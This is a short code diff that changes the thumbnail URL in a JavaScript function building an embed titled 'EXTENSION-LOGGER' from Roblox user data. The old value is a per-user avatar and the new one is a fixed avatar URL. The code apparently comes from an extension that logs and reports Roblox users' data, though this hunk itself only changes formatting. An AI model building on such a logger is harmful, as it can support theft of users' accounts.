@@ -475,7 +475,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
     title: "<:emoji_37:1410520517349212200> **EXTENSION-LOGGER**",
     color: 0xFFFFFF,
     thumbnail: {
-    url: userData.avatarThumbnail
+    url: "https://www.roblox.com/avatar-thumbnail/image?userId=8113884770&width=420&height=420&format=png"
     },
     fields: [
       {
